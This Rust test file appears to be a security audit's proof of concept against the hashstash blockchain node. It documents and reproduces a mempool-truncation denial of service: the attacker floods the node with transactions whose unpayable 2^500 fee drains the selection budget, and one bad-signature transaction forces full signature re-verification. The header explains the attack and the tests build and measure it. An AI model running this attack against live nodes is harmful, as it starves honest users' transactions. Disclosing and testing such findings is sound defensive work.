//! Proof-of-concept for finding H9: budget-amplified mempool truncation via
//! unpayable high-priority transactions, plus the related full-mempool
//! signature re-verification cost.
//!
//! ## Finding
//!
//! `Chain::select_executed` (src/chain.rs ~851-1013) bounds its state-execution
//! work with a budget proportional to the *candidate count*:
//!
//! ```text
//! let budget = candidates.len() * SELECTION_ATTEMPTS_PER_CANDIDATE; // chain.rs:873 (×4)
//! ```
//!
//! After every accepted transaction the scan restarts at index 0 (the `break`
//! at chain.rs:995), and a candidate whose `apply_verified_transaction` *fails*
//! is NOT removed from `pending` — it only does `index += 1` (chain.rs:996-997).
//! So any candidate that (a) matches the sender's current nonce and (b) fails to
//! apply is **re-charged one execution attempt on every restart**, i.e. once per
//! accepted honest transaction.
//!
//! `fees::quote` (src/fees.rs:65-127) ranks candidates by miner fee but never
//! checks that the sender can actually pay: `check_amount` only verifies
//! `fee.bits() <= money_bits` (= 512, src/config.rs:312-314). A fee of `2^500`
//! therefore passes the quote, sorts *first* by miner earnings
//! (chain.rs:921-928), and only fails later inside `reserve_inputs`
//! (`cash <= a.ordinary`, src/consensus.rs:59-62).
//!
//! An attacker funds ONE account and broadcasts A transactions, all at that
//! account's *current* nonce (so the nonce gate at chain.rs:942 keeps matching
//! and the account nonce never advances), each carrying an unpayable `2^500`
//! fee. These A candidates rank ahead of every honest transaction, so each of
//! the ~`budget / (A + 1)` honest acceptances first burns A attempts on the
//! attacker set. Honest throughput per block collapses from `H` to roughly
//!
//! ```text
//!   honest_selected ≈ (H + A) * 4 / (A + 1)
//! ```
//!
//! `Node::receive_peer` (src/node.rs:1137-1182) admits a whole peer batch and
//! then unconditionally OVERWRITES `i.mempool` with this truncated selection
//! (node.rs:1176-1179 → `Self::selected` node.rs:743-751 →
//! `Chain::select_transactions` chain.rs:823-831). A single peer message
//! carrying A = `MAX_MEMPOOL` = 256 such transactions (node.rs:43,1144) thus
//! shrinks the victim's whole mempool:
//!   * `H = 4096`, large blocks → `(4352)*4/257 ≈ 68` honest survive.
//!   * `H ≈ 100`, 16 KiB blocks → `(356)*4/257 ≈ 5` honest survive.
//!
//! ## Related prior finding
//!
//! Every selection re-verifies the signature of *every* candidate exactly once
//! (chain.rs:892-895). Because `receive_peer`/`submit_transaction` re-run
//! selection over the full mempool on each delivery, a single transaction with a
//! bad signature forces a full-mempool signature re-verification under the node
//! lock (node.rs:798-821, chain.rs:891-895) before it is finally rejected.
//!
//! ## How this PoC drives the code
//!
//! `receive_peer` is private and the real delivery path is async p2p
//! (`node::serve` / `node::sync_peer`). This PoC instead calls the public
//! `Chain::select_transactions` — the exact function `receive_peer` uses to
//! recompute `i.mempool` — with the same `honest ++ attacker` candidate set, and
//! separately times the public `Node::submit_transaction` path for the
//! re-verification cost. `SelectionResult` (chain.rs:58-64) exposes
//! `transactions`, `signatures_checked`, `execution_attempts`,
//! `budget_exhausted`.
//!
//! ## Run
//!
//! ```text
//! cargo test --release --features test-fixtures --test poc_mempool_truncate -- --nocapture
//! ```
//!
//! (The `test-fixtures` feature makes `work_per_atom == 1` so coinbase funds the
//! test accounts; the required `[[test]]` stanza is listed in the task report.)
//!
//! ## Interpretation
//!
//! A passing run demonstrates the vulnerability. In
//! `h9_budget_amplified_mempool_shrink` the baseline selects all `H` honest
//! transactions while the attacked selection keeps only a tiny fraction of them,
//! reports `budget_exhausted == true`, and burns `(H + A) * 4` execution
//! attempts — even though the attacker lands ZERO transactions. The attacker
//! spends only transaction-relay bandwidth (no fee is ever paid, because every
//! attacker apply fails) yet evicts the honest backlog from the block template
//! and, in `receive_peer`, from the mempool itself.

use hashstash::{
    chain::{Chain, SELECTION_ATTEMPTS_PER_CANDIDATE},
    codec,
    config::Config,
    crypto,
    node::{self, Node},
    types::*,
};
use std::time::Instant;

mod support;

/// Miner key; also the honest payer (funded by coinbase, exactly like the
/// existing `tests/selection_budget.rs` fixtures).
const SECRET: [u8; 32] = [61; 32];
/// The single funded attacker account.
const ATTACKER: [u8; 32] = [200; 32];

fn key() -> PublicKey {
    crypto::public_key(&SECRET).unwrap()
}

/// Easy-difficulty fixture config (mirrors `selection_budget::configuration`).
/// `initial_bits = 0x1f1fffff` gives a per-block coinbase of ~2048 atoms under
/// `test-fixtures`, which funds every account this PoC uses.
fn configuration() -> Config {
    let mut c = Config::devnet();
    c.initial_bits = 0x1f1fffff;
    c.limit_bits = c.initial_bits;
    c.initial.block_bytes = 262_144;
    c
}

/// Mine one block to `key()` over the given transactions and extend the chain
/// (copied from `tests/selection_budget.rs`).
fn append(chain: &mut Chain, transactions: Vec<Transaction>) -> Block {
    let time = chain.tip_block().header.timestamp + chain.tip_state().settings.interval as u32;
    let block = Chain::mine(chain.template(key(), transactions, time).unwrap(), 100_000).unwrap();
    chain.submit(block.clone(), time as u64).unwrap();
    block
}

/// Sign a transaction at exactly the mandatory minimum fee (copied from
/// `tests/selection_budget.rs`; `support::sign_minimum` overwrites `fee`).
fn signed(
    chain: &Chain,
    secret: &[u8; 32],
    nonce: u64,
    operation: Operation,
    expiry_offset: u64,
) -> Transaction {
    support::sign_minimum(
        chain.tip_state(),
        TransactionBody {
            data: Vec::new(),
            sender: crypto::public_key(secret).unwrap(),
            nonce,
            fee: 0u32.into(),
            anchor: codec::block_hash(&codec::genesis_block(&chain.config).unwrap()),
            expiry_blocks: chain.tip_height() + 10_000 + expiry_offset,
            operation,
        },
        secret,
        0,
    )
}

/// A valid, applyable honest transaction: a 1-atom self-payment.
fn self_payment(chain: &Chain, secret: &[u8; 32], nonce: u64) -> Transaction {
    signed(
        chain,
        secret,
        nonce,
        Operation::TransferExact {
            recipient: crypto::public_key(secret).unwrap(),
            amount: 1u32.into(),
        },
        0,
    )
}

/// An attacker transaction that passes every pre-apply gate (signature,
/// `fees::quote`, anchor, and the nonce gate) yet fails to apply because its fee
/// cannot be reserved.
///
/// * `nonce` is the attacker account's CURRENT on-chain nonce. Because the apply
///   fails, the nonce never advances, so chain.rs:942 keeps matching it on every
///   restart and the candidate is re-charged each time.
/// * `fee = 2^500` passes `check_amount` (501 bits <= 512, config.rs:313) and
///   `fees::quote`, ranks first by miner earnings (chain.rs:923), then fails at
///   `reserve_inputs` `cash <= a.ordinary` (consensus.rs:59-62).
/// * `salt` perturbs `expiry_blocks` so the A copies have distinct txids and are
///   not collapsed by the dedup at chain.rs:886.
fn unpayable(chain: &Chain, secret: &[u8; 32], nonce: u64, salt: u64) -> Transaction {
    let sender = crypto::public_key(secret).unwrap();
    let huge_fee: Amount = Amount::from(1u32) << 500usize; // 2^500
    crypto::sign(
        &TransactionBody {
            data: Vec::new(),
            sender,
            nonce,
            fee: huge_fee,
            anchor: codec::block_hash(&codec::genesis_block(&chain.config).unwrap()),
            expiry_blocks: chain.tip_height() + 10_000 + salt,
            operation: Operation::TransferExact {
                recipient: sender, // already exists → no account-creation repricing
                amount: 1u32.into(),
            },
        },
        secret,
    )
    .unwrap()
}

/// Run selection for an honest-only candidate set (baseline) and for
/// `honest ++ attacker` (the attack), returning
/// `(baseline_honest, attack_honest, attack_result)`.
fn run_scenario(
    chain: &Chain,
    honest: &[Transaction],
    attacker: &[Transaction],
    limit: usize,
) -> (usize, usize, hashstash::chain::SelectionResult) {
    let baseline = chain.select_transactions(key(), honest, limit).unwrap();
    let baseline_honest = baseline.transactions.len();

    // Exactly mirrors Node::receive_peer (node.rs:1164-1177): candidates are the
    // existing (honest) mempool followed by the peer's transactions, and the
    // result OVERWRITES the mempool.
    let mut combined = honest.to_vec();
    combined.extend_from_slice(attacker);
    let attack = chain.select_transactions(key(), &combined, limit).unwrap();
    let attack_honest = attack
        .transactions
        .iter()
        .filter(|t| t.body.sender == key())
        .count();
    (baseline_honest, attack_honest, attack)
}

/// Core PoC: large blocks so the *budget*, not block capacity, bounds the
/// selection. One 256-tx peer message collapses honest throughput by well over
/// an order of magnitude.
#[test]
fn h9_budget_amplified_mempool_shrink() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = configuration();
    config.initial.block_bytes = 1024 * 1024; // 1 MiB: budget is the binding limit
    let mut chain = Chain::open(&dir.path().join("h9-budget.db"), config).unwrap();

    // Fund the miner / honest payer via coinbase.
    for _ in 0..10 {
        append(&mut chain, vec![]);
    }

    // Fund (create) the single attacker account so its transactions match its
    // own current nonce in the selector's nonce gate (chain.rs:942).
    let attacker_pub = crypto::public_key(&ATTACKER).unwrap();
    let key_nonce = chain.tip_state().account(&key(), None).unwrap().nonce;
    let fund = signed(
        &chain,
        &SECRET,
        key_nonce,
        Operation::TransferExact {
            recipient: attacker_pub,
            amount: 1_000u32.into(),
        },
        0,
    );
    append(&mut chain, vec![fund]);

    let attacker_nonce = chain.tip_state().account(&attacker_pub, None).unwrap().nonce;
    let honest_start = chain.tip_state().account(&key(), None).unwrap().nonce;

    const H: usize = 1024; // honest transactions ("the mempool")
    const A: usize = 256; // attacker transactions (one MAX_MEMPOOL peer batch)

    let honest: Vec<Transaction> = (0..H)
        .map(|i| self_payment(&chain, &SECRET, honest_start + i as u64))
        .collect();
    let attacker: Vec<Transaction> = (0..A)
        .map(|i| unpayable(&chain, &ATTACKER, attacker_nonce, i as u64))
        .collect();

    // Node passes mempool_limit (= MAX_ADAPTIVE_MEMPOOL = 4096) as `limit`.
    let limit = 4096usize;
    let (baseline_honest, attack_honest, attack) =
        run_scenario(&chain, &honest, &attacker, limit);
    let attack_attacker = attack.transactions.len() - attack_honest;

    println!("=== H9: budget-amplified mempool shrink (block_bytes = 1 MiB) ===");
    println!("candidates:              {H} honest + {A} attacker = {}", H + A);
    println!("baseline honest selected: {baseline_honest}");
    println!("attacked honest selected: {attack_honest}");
    println!("attacker txs selected:    {attack_attacker} (always 0: every attacker apply fails)");
    println!("budget_exhausted:         {}", attack.budget_exhausted);
    println!(
        "execution_attempts:       {}  (= (H+A) * {} budget)",
        attack.execution_attempts, SELECTION_ATTEMPTS_PER_CANDIDATE
    );
    println!("signatures_checked:       {}", attack.signatures_checked);
    println!(
        "=> one {A}-tx peer message shrinks the honest block from {baseline_honest} to {attack_honest}"
    );
    println!(
        "   projected at H=4096: ~{} honest survive",
        (4096 + A) * SELECTION_ATTEMPTS_PER_CANDIDATE / (A + 1)
    );

    // The attacker never lands a transaction — it only burns the budget.
    assert_eq!(attack_attacker, 0, "attacker transactions must never apply");
    // Without the attack, (essentially) every honest transaction is selected.
    assert!(
        baseline_honest >= H - 2,
        "baseline must select all honest txs, got {baseline_honest} of {H}"
    );
    // The attack reports the budget as exhausted...
    assert!(attack.budget_exhausted, "selection budget must be exhausted");
    // ...having consumed exactly the candidate-count-scaled budget.
    assert_eq!(
        attack.execution_attempts,
        (H + A) * SELECTION_ATTEMPTS_PER_CANDIDATE
    );
    // Signatures are charged once per unique candidate; the amplification is in
    // execution_attempts, not here.
    assert_eq!(attack.signatures_checked, H + A);
    // Honest throughput collapses by more than 10x.
    assert!(
        attack_honest < baseline_honest / 10,
        "expected a sharp drop: {attack_honest} vs {baseline_honest}"
    );
    assert!(attack_honest <= A);
}

/// Second data point from the finding: default-sized 16 KiB blocks. Block
/// capacity bounds the honest baseline to ~100; the same 256-tx attack leaves a
/// handful.
#[test]
fn h9_default_16kib_block_shrink() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = configuration();
    config.initial.block_bytes = 16 * 1024; // devnet default block capacity
    let mut chain = Chain::open(&dir.path().join("h9-16k.db"), config).unwrap();

    for _ in 0..10 {
        append(&mut chain, vec![]);
    }

    let attacker_pub = crypto::public_key(&ATTACKER).unwrap();
    let key_nonce = chain.tip_state().account(&key(), None).unwrap().nonce;
    let fund = signed(
        &chain,
        &SECRET,
        key_nonce,
        Operation::TransferExact {
            recipient: attacker_pub,
            amount: 1_000u32.into(),
        },
        0,
    );
    append(&mut chain, vec![fund]);

    let attacker_nonce = chain.tip_state().account(&attacker_pub, None).unwrap().nonce;
    let honest_start = chain.tip_state().account(&key(), None).unwrap().nonce;

    const H: usize = 160; // more than a 16 KiB block can hold → capacity-bound baseline
    const A: usize = 256;

    let honest: Vec<Transaction> = (0..H)
        .map(|i| self_payment(&chain, &SECRET, honest_start + i as u64))
        .collect();
    let attacker: Vec<Transaction> = (0..A)
        .map(|i| unpayable(&chain, &ATTACKER, attacker_nonce, i as u64))
        .collect();

    let limit = 4096usize;
    let (baseline_honest, attack_honest, attack) =
        run_scenario(&chain, &honest, &attacker, limit);

    println!("=== H9: 16 KiB default blocks ===");
    println!("baseline honest selected: {baseline_honest} (block-capacity bound)");
    println!("attacked honest selected: {attack_honest}");
    println!("budget_exhausted:         {}", attack.budget_exhausted);
    println!("execution_attempts:       {}", attack.execution_attempts);
    println!("signatures_checked:       {}", attack.signatures_checked);

    assert!(
        baseline_honest >= 40,
        "a 16 KiB block should hold tens of honest txs, got {baseline_honest}"
    );
    assert!(attack.budget_exhausted);
    assert_eq!(attack.signatures_checked, H + A);
    assert_eq!(
        attack.execution_attempts,
        (H + A) * SELECTION_ATTEMPTS_PER_CANDIDATE
    );
    assert!(
        attack_honest < baseline_honest / 5,
        "expected a sharp drop: {attack_honest} vs {baseline_honest}"
    );
}

/// Config-only transaction builder for the `Node` (no `Chain` handle): a
/// genesis-anchored self-payment at a fixed fee above the minimum.
fn node_self_payment(c: &Config, secret: &[u8; 32], nonce: u64) -> Transaction {
    let sender = crypto::public_key(secret).unwrap();
    crypto::sign(
        &TransactionBody {
            data: Vec::new(),
            sender,
            nonce,
            fee: 10u32.into(), // >= minimum for a small self-payment
            anchor: codec::block_hash(&codec::genesis_block(c).unwrap()),
            expiry_blocks: 100_000,
            operation: Operation::TransferExact {
                recipient: sender,
                amount: 1u32.into(),
            },
        },
        secret,
    )
    .unwrap()
}

/// Related prior finding: one bad-signature transaction forces a full-mempool
/// signature re-verification on the public `submit_transaction` path (the same
/// path `receive_peer` uses), under the node lock.
#[test]
fn h9_bad_signature_forces_full_reverification() {
    let dir = tempfile::tempdir().unwrap();
    let mut config = configuration();
    config.initial.block_bytes = 1024 * 1024; // hold a full mempool
    let node = Node::open(&dir.path().join("timing.db"), config.clone(), key()).unwrap();

    // Fund the miner via coinbase.
    for _ in 0..10 {
        node.mine(100_000).unwrap();
    }

    // Fill the mempool with honest self-payments. Each submit itself re-runs
    // selection, so this also shows the O(n^2) cost of growing the pool.
    let target = node::MAX_MEMPOOL; // 256
    for nonce in 0..target as u64 {
        node.submit_transaction(node_self_payment(&config, &SECRET, nonce))
            .unwrap();
    }
    let filled = node.status().unwrap()["mempool"].as_u64().unwrap() as usize;

    // Baseline: resubmitting an existing transaction short-circuits before any
    // selection / signature work (node.rs:800-802).
    let dup = node_self_payment(&config, &SECRET, 0);
    let t0 = Instant::now();
    let _ = node.submit_transaction(dup);
    let dup_elapsed = t0.elapsed();

    // One transaction with a bad signature cannot short-circuit (its id differs),
    // so submit_locked re-runs selection over the whole mempool, re-verifying
    // every signature (chain.rs:892-895) before rejecting it.
    let mut bad = node_self_payment(&config, &SECRET, 0);
    bad.signature[0] ^= 1;
    let t1 = Instant::now();
    let rejected = node.submit_transaction(bad);
    let bad_elapsed = t1.elapsed();

    println!("=== H9 related: full-mempool signature re-verification ===");
    println!("mempool size:                         {filled}");
    println!("duplicate resubmit (short-circuit):   {dup_elapsed:?}");
    println!("bad-signature resubmit (full verify): {bad_elapsed:?}");
    println!("bad transaction rejected:             {}", rejected.is_err());

    // The bad signature never enters the mempool...
    assert!(rejected.is_err(), "bad signature must be rejected");
    assert!(filled >= 1, "mempool should have been filled");
    // ...but rejecting it still costs a full re-verification the duplicate skips.
    assert!(
        bad_elapsed >= dup_elapsed,
        "bad-signature path re-verifies the whole mempool: {bad_elapsed:?} vs {dup_elapsed:?}"
    );
}
